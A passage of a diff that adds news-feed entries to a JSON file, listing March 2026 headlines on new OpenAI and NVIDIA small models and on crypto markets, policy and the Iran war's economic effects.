+      "summary": "OpenAI today: Introducing GPT‑5.4 mini and nano. These models join GPT-5.4 which was released two weeks ago.\nOpenAI's self-reported benchmarks show the new 5.4-nano out-performing their previous GPT-5 mini model when run at maximum reasoning effort. The new mini is also 2x faster than the previous mini.\nHere's how the pricing looks - all prices are per million tokens. gpt-5.4-nano is notably even cheaper than Google's Gemini 3.1 Flash-Lite:\n\n  \n    \n      Model\n      Input\n      Cached input\n   ",
+      "published": "2026-03-17T19:39:17+00:00",
+      "topics": [
+        "llm",
+        "ai-agent",
+        "frontier-tech"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "huggingface-rss",
+      "source_name": "Hugging Face Blog",
+      "source_type": "rss",
+      "title": "Nemotron 3 Nano 4B: A Compact Hybrid Model for Efficient Local AI",
+      "url": "https://huggingface.co/blog/nvidia/nemotron-3-nano-4b",
+      "summary": "",
+      "published": "2026-03-17T23:17:07+00:00",
+      "topics": [
+        "llm",
+        "ai-agent"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Kalshi co-founder fights back against Arizona’s ‘overstep’ in what a lawyer calls a federal-state turf war",
+      "url": "https://www.coindesk.com/policy/2026/03/18/kalshi-co-founder-fights-back-against-arizona-s-overstep-in-what-a-lawyer-calls-a-federal-state-turf-war",
+      "summary": "",
+      "published": "2026-03-18T18:19:24+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Federal Reserve holds policy steady as Iran war adds to growth and inflation concerns",
+      "url": "https://www.coindesk.com/markets/2026/03/18/federal-reserve-holds-policy-steady-as-it-balances-growth-and-inflation-concerns",
+      "summary": "",
+      "published": "2026-03-18T17:59:47+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "The era of cheap money is over as the Iran war creates a permanent 'inflation floor'",
+      "url": "https://www.coindesk.com/markets/2026/03/18/the-era-of-cheap-money-is-over-as-the-iran-war-creates-a-permanent-inflation-floor",
+      "summary": "",
+      "published": "2026-03-18T17:09:02+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Crypto Long & Short: When price stops working, yield starts mattering",
+      "url": "https://www.coindesk.com/coindesk-indices/2026/03/18/crypto-long-and-short-when-price-stops-working-yield-starts-mattering",
+      "summary": "",
+      "published": "2026-03-18T16:17:13+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "The Protocol: Ethereum community debates foundation’s new mandate document",
+      "url": "https://www.coindesk.com/tech/2026/03/18/the-protocol-ethereum-community-debates-foundation-s-new-mandate-document",
+      "summary": "",
+      "published": "2026-03-18T15:52:37+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Former Binance CEO CZ waves off accusations on Iran, terror ties",
+      "url": "https://www.coindesk.com/policy/2026/03/18/former-binance-ceo-cz-waves-off-accusations-on-iran-terror-ties",
+      "summary": "",
+      "published": "2026-03-18T15:48:29+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Trump-linked American Bitcoin's BTC holdings overtake Mike Novogratz’s Galaxy Digital",
+      "url": "https://www.coindesk.com/business/2026/03/18/trump-linked-american-bitcoin-just-overtook-mike-novogratz-s-galaxy-digital-in-the-bitcoin-rankings",
+      "summary": "",
+      "published": "2026-03-18T15:44:32+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Crypto exchange Kraken freezes multibillion-dollar IPO plan due to difficult market conditions",
+      "url": "https://www.coindesk.com/business/2026/03/17/crypto-exchange-kraken-freezes-multibillion-dollar-ipo-plan-due-to-difficult-market-conditions",
+      "summary": "",
+      "published": "2026-03-18T15:14:18+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Traders can now bet on the S&P 500 around the clock without ever touching a traditional stock exchange",
+      "url": "https://www.coindesk.com/markets/2026/03/18/traders-can-now-bet-on-the-s-and-p-500-around-the-clock-without-ever-touching-a-traditional-stock-exchange",
+      "summary": "",
+      "published": "2026-03-18T15:13:09+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Key U.S. senator on crypto market structure bill negotiation: 'We think we've got it'",
+      "url": "https://www.coindesk.com/policy/2026/03/18/key-u-s-senator-on-crypto-market-structure-bill-negotiation-we-think-we-ve-got-it",
+      "summary": "",
+      "published": "2026-03-18T15:10:40+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Bitcoin hash rate is tumbling as Iran war lifts energy prices",
+      "url": "https://www.coindesk.com/markets/2026/03/18/bitcoin-hash-rate-is-tumbling-as-iran-war-lifts-energy-prices",
+      "summary": "",
+      "published": "2026-03-18T14:53:08+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Bank of Korea adds two banks to digital won trials as real-world testing begins",
+      "url": "https://www.coindesk.com/business/2026/03/18/bank-of-korea-adds-two-banks-to-digital-won-trials-as-real-world-testing-begins",
+      "summary": "",
+      "published": "2026-03-18T14:19:54+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "Stripe-led payments blockchain Tempo goes live with protocol for AI agents",
+      "url": "https://www.coindesk.com/tech/2026/03/18/stripe-led-payments-blockchain-tempo-goes-live-with-protocol-for-ai-agents",
+      "summary": "",
+      "published": "2026-03-18T14:05:28+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    },
+    {
+      "source_id": "coindesk-rss",
+      "source_name": "CoinDesk",
+      "source_type": "rss",
+      "title": "CoinDesk 20 performance update: index falls 3.1% as all constituents trade lower",
+      "url": "https://www.coindesk.com/coindesk-indices/2026/03/18/coindesk-20-performance-update-index-falls-3-1-as-all-constituents-trade-lower",
+      "summary": "",
+      "published": "2026-03-18T14:01:26+00:00",
+      "topics": [
+        "crypto"
+      ],
+      "priority": true,
+      "quality_score": 10
+    }
+  ]
+}
